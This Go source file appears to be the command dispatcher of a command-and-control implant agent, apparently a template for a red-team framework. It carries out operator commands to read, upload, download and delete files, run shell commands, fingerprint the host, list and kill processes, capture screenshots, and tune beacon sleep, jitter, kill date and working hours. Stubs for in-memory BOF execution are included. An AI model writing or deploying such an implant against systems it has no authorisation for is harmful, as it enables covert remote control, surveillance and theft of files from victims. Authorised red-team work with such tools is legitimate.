package main

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"runtime"

	"__NAME__/protocol"
)

// TaskProcess dispatches each raw command object and returns response objects.
func TaskProcess(objects [][]byte) [][]byte {
	var responses [][]byte
	for _, obj := range objects {
		var cmd protocol.Command
		if err := protocol.Unmarshal(obj, &cmd); err != nil {
			continue
		}
		resp := dispatch(cmd)
		if resp != nil {
			responses = append(responses, resp)
		}
	}
	return responses
}

func dispatch(cmd protocol.Command) []byte {
	switch cmd.Code {

	case protocol.COMMAND_EXIT:
		os.Exit(0)
		return nil

	// ── File system ────────────────────────────────────────────────────────────

	case protocol.COMMAND_FS_LIST:
		var p protocol.ParamsFsList
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path, entries, err := agent.GetListing(p.Path)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.RESP_FS_LIST, cmd.Id, protocol.AnsFsList{Path: path, Entries: entries})

	case protocol.COMMAND_FS_UPLOAD:
		var p protocol.ParamsFsUpload
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path := agent.NormalizePath(p.Path)
		if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		if err := os.WriteFile(path, p.Data, 0644); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.RESP_FS_UPLOAD, cmd.Id, protocol.AnsFsUpload{Path: path})

	case protocol.COMMAND_FS_DOWNLOAD:
		var p protocol.ParamsFsDownload
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path := agent.NormalizePath(p.Path)
		data, err := os.ReadFile(path)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.RESP_FS_DOWNLOAD, cmd.Id, protocol.AnsFsDownload{Path: path, Data: data})

	case protocol.COMMAND_FS_REMOVE:
		var p protocol.ParamsFsRemove
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		if err := os.RemoveAll(agent.NormalizePath(p.Path)); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(cmd.Id)

	case protocol.COMMAND_FS_MKDIRS:
		var p protocol.ParamsFsMkdirs
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		if err := os.MkdirAll(agent.NormalizePath(p.Path), 0755); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(cmd.Id)

	case protocol.COMMAND_FS_COPY:
		var p protocol.ParamsFsCopy
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		src := agent.NormalizePath(p.Src)
		dst := agent.NormalizePath(p.Dst)
		info, err := os.Stat(src)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		if info.IsDir() {
			err = agent.CopyDir(src, dst)
		} else {
			err = agent.CopyFile(src, dst)
		}
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(cmd.Id)

	case protocol.COMMAND_FS_MOVE:
		var p protocol.ParamsFsMove
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		if err := os.Rename(agent.NormalizePath(p.Src), agent.NormalizePath(p.Dst)); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(cmd.Id)

	case protocol.COMMAND_FS_CD:
		var p protocol.ParamsFsCd
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		path := agent.NormalizePath(p.Path)
		if err := os.Chdir(path); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(cmd.Id)

	case protocol.COMMAND_FS_PWD:
		cwd, err := os.Getwd()
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.RESP_FS_PWD, cmd.Id, protocol.AnsFsPwd{Path: cwd})

	case protocol.COMMAND_FS_CAT:
		var p protocol.ParamsFsCat
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		data, err := os.ReadFile(agent.NormalizePath(p.Path))
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.RESP_FS_CAT, cmd.Id, protocol.AnsFsCat{Content: string(data)})

	// ── OS ─────────────────────────────────────────────────────────────────────

	case protocol.COMMAND_OS_RUN:
		var p protocol.ParamsOsRun
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		output, err := agent.RunShell(p.Command, p.Output, p.Wait)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.RESP_OS_RUN, cmd.Id, protocol.AnsOsRun{Output: output})

	case protocol.COMMAND_OS_INFO:
		hostname, _ := os.Hostname()
		username := os.Getenv("USER")
		if username == "" {
			username = os.Getenv("USERNAME")
		}
		domain := os.Getenv("USERDOMAIN")
		if domain == "" {
			domain = hostname
		}
		internalIP := ""
		if ifaces, err := net.Interfaces(); err == nil {
		outerIP:
			for _, iface := range ifaces {
				if iface.Flags&net.FlagLoopback != 0 {
					continue
				}
				if addrs, err := iface.Addrs(); err == nil {
					for _, a := range addrs {
						if ipNet, ok := a.(*net.IPNet); ok && ipNet.IP.To4() != nil {
							internalIP = ipNet.IP.String()
							break outerIP
						}
					}
				}
			}
		}
		ans := protocol.AnsOsInfo{
			Hostname:    hostname,
			Username:    username,
			Domain:      domain,
			InternalIP:  internalIP,
			Os:          runtime.GOOS,
			OsVersion:   agent.GetOsVersion(),
			OsArch:      runtime.GOARCH,
			Elevated:    agent.IsElevated(),
			ProcessId:   uint32(os.Getpid()),
			ProcessName: processName(),
			CodePage:    agent.GetCP(),
		}
		return okResp(protocol.RESP_OS_INFO, cmd.Id, ans)

	case protocol.COMMAND_OS_PS:
		procs, err := agent.ListProcesses()
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.RESP_OS_PS, cmd.Id, protocol.AnsOsPs{Processes: procs})

	case protocol.COMMAND_OS_SCREENSHOT:
		img, err := agent.CaptureScreenshot()
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.RESP_OS_SCREENSHOT, cmd.Id, protocol.AnsOsScreenshot{Image: img})

	case protocol.COMMAND_OS_SHELL:
		var p protocol.ParamsOsShell
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		output, err := agent.RunShell(p.Command, true, true)
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return okResp(protocol.RESP_OS_SHELL, cmd.Id, protocol.AnsOsShell{Output: output})

	case protocol.COMMAND_OS_KILL:
		var p protocol.ParamsOsKill
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		proc, err := os.FindProcess(int(p.Pid))
		if err != nil {
			return errResp(cmd.Id, err.Error())
		}
		if err := proc.Kill(); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		return completeResp(cmd.Id)

	// ── Profile tuning ─────────────────────────────────────────────────────────

	case protocol.COMMAND_PROFILE_SLEEP:
		var p protocol.ParamsProfileSleep
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		stateMu.Lock()
		agentSleep = p.Sleep
		agentJitter = p.Jitter
		stateMu.Unlock()
		return completeResp(cmd.Id)

	case protocol.COMMAND_PROFILE_KILLDATE:
		var p protocol.ParamsProfileKilldate
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		stateMu.Lock()
		killDate = p.KillDate
		stateMu.Unlock()
		return completeResp(cmd.Id)

	case protocol.COMMAND_PROFILE_WORKTIME:
		var p protocol.ParamsProfileWorktime
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		stateMu.Lock()
		workStart = p.WorkStart
		workEnd = p.WorkEnd
		stateMu.Unlock()
		return completeResp(cmd.Id)

	// ── BOF execution ──────────────────────────────────────────────────────────

	case protocol.COMMAND_EXEC_BOF:
		var p protocol.ParamsExecBof
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		// TODO: Integrate a COFF loader (e.g. the coffer package from gopher_agent).
		//
		// args, _ := base64.StdEncoding.DecodeString(p.ArgsPack)
		// msgs, err := coffer.Load(p.Object, args)
		// if err != nil {
		//     return errResp(cmd.Id, err.Error())
		// }
		// list, _ := protocol.Marshal(msgs)
		// return okResp(protocol.COMMAND_EXEC_BOF, cmd.Id, protocol.AnsExecBof{Msgs: list})
		return errResp(cmd.Id, "BOF loader not yet implemented")

	case protocol.COMMAND_EXEC_BOF_ASYNC:
		var p protocol.ParamsExecBof
		if err := protocol.Unmarshal(cmd.Data, &p); err != nil {
			return errResp(cmd.Id, err.Error())
		}
		// TODO: Integrate async COFF loader (coffer.LoadAsync) with BOF_PACK output streaming.
		return errResp(cmd.Id, "async BOF loader not yet implemented")

	// ── Job management ─────────────────────────────────────────────────────────

	case protocol.COMMAND_JOB_LIST:
		// TODO: Collect active jobs and return AnsJobList
		list, _ := protocol.Marshal([]protocol.JobInfo{})
		return okResp(protocol.COMMAND_JOB_LIST, cmd.Id, protocol.AnsJobList{List: list})

	case protocol.COMMAND_JOB_KILL:
		// TODO: Kill the job identified by the task ID in cmd.Data
		return completeResp(cmd.Id)

	default:
		return errResp(cmd.Id, fmt.Sprintf("unknown command code %d", cmd.Code))
	}
}

// ─── Response helpers ──────────────────────────────────────────────────────────

func completeResp(id uint) []byte {
	data, _ := protocol.Marshal(protocol.Command{Code: protocol.RESP_COMPLETE, Id: id})
	return data
}

func errResp(id uint, msg string) []byte {
	payload, _ := protocol.Marshal(protocol.AnsError{Message: msg})
	data, _ := protocol.Marshal(protocol.Command{Code: protocol.RESP_ERROR, Id: id, Data: payload})
	return data
}

func okResp(code uint, id uint, val interface{}) []byte {
	payload, _ := protocol.Marshal(val)
	data, _ := protocol.Marshal(protocol.Command{Code: code, Id: id, Data: payload})
	return data
}
